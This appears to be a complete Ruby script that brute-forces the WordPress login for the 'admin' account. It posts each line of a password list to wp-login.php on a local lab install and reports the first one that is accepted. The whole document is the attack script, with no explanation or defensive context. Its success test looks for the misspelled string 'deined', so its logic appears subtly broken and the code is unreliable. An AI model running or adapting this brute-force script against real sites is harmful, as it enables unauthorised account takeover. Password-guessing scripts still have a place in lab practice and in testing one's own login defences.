require 'net/http'
require 'uri'

def is_wrong_password? password
				uri = URI.parse "http://localhost/wplab/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwplab%2Fwp-admin%2F&reauth=1"
				response = Net::HTTP.post_form(uri, :login => "admin", :password => password).body
				response.include? "deined"
end

input = File.open "passwords.txt", "r"
while (line = input.gets)
		line.strip!
		print "Trying password #{line}..."
		if is_wrong_password? line
				puts "Error"
		else
				puts "Found!"
				input.close
				exit
		end
end
